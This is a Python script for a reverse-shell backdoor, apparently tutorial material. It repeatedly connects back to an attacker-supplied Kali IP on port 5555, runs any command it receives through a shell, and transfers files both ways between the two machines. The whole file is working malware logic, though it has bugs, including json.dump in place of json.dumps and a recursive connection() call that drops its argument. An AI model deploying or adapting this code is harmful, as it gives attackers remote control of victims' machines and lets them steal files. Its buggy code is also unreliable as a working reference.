import socket
import time
import json
import os
import subprocess

def reliable_send(data):
    jsondata = json.dump(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

ip = str(input("Insert your Kali IP:\n"))

def connection(kali_ip):
    while True:
        time.sleep(20)
        try:
            s.connect((kali_ip, 5555))
            shell()
            s.close()
            break
        except:
            connection()
    
def upload_file(file):
    f = open(file, 'rb')
    s.send(f.read())

def download_file(file):
    f = open(file, "wb")
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:8] == "download":
            upload_file(command[9:])
        elif command[:6] == "upload":
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection(ip)